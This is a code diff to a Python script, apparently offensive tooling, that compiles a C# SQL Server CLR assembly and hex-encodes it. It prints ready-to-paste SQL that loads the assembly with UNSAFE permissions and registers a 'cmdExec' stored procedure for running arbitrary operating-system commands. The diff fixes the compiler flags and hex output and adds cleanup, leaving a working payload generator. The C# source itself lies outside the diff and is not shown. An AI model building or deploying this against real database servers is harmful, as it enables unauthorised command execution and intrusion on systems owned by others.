@@ -1,5 +1,6 @@
 #!/bin/env python3
 import ak
+import os
 import binascii
 
 FN_BASE = "win_sqlassembly"
@@ -34,24 +35,35 @@ class SQLAssembly:
         };
         """
 
+        self.compile()
+
     def compile(self):
         ak.write_file(self.source_filename, self.template)
-        ak.cs_compile(self.source_filename, f"/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll -o {self.compiled_filename})
+        ak.cs_compile(self.source_filename, f"/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll -out:{self.compiled_filename}")
 
     def get_hex(self):
         with open(self.compiled_filename, 'rb') as f:
             content = f.read()
-        return binascii.hexlify(content)
+        return str(binascii.hexlify(content), 'ascii')
+
+    def cleanup(self):
+        if os.path.exists(self.source_filename):
+            os.remove(self.source_filename)
+        if os.path.exists(self.compiled_filename):
+            os.remove(self.compiled_filename)
+
 
 
 def main():
     # Convert to hex
     s = SQLAssembly(FN_BASE)
 
-    print(s.get_hex())
+    h = s.get_hex()
 
-    print(f"Load with: CREATE ASSEMBLY my_assembly FROM 0x{s}..... WITH PERMISSION_SET = UNSAFE;")
+    print(f"Load with: CREATE ASSEMBLY my_assembly FROM 0x{h} WITH PERMISSION_SET = UNSAFE;")
     print("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
+
+    s.cleanup()
 
 if __name__ == "__main__":
     main()
